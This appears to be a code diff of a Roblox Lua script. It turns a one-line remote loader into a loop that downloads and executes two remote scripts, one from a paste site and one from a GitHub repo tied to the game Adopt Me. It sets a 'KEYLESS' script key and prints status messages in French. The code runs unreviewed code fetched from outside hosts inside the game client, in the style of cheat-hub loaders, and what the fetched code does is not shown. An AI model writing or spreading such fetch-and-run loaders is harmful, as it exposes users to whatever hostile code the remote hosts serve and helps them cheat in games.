@@ -1,1 +1,32 @@
-loadstring(game:HttpGet("https://pastefy.app/D2SDwi9W/raw"))()
+local scripts = {
+    {
+        name = "Script 1",
+        url = "https://pastefy.app/D2SDwi9W/raw"
+    },
+    {
+        name = "ArgonHubX",
+        url = "https://raw.githubusercontent.com/eeeiqjj876y/adoptme.github.io/refs/heads/main/ringta.lua",
+        setupFunc = function()
+            getgenv().SCRIPT_KEY = "KEYLESS"
+        end
+    }
+}
+
+for _, script in ipairs(scripts) do
+    spawn(function()
+        local success, err = pcall(function()
+            -- Run setup function if it exists
+            if script.setupFunc then
+                script.setupFunc()
+            end
+            -- Load the script
+            loadstring(game:HttpGet(script.url))()
+        end)
+        
+        if success then
+            print("✓ " .. script.name .. " chargé avec succès")
+        else
+            warn("✗ " .. script.name .. " a échoué: " .. tostring(err))
+        end
+    end)
+end
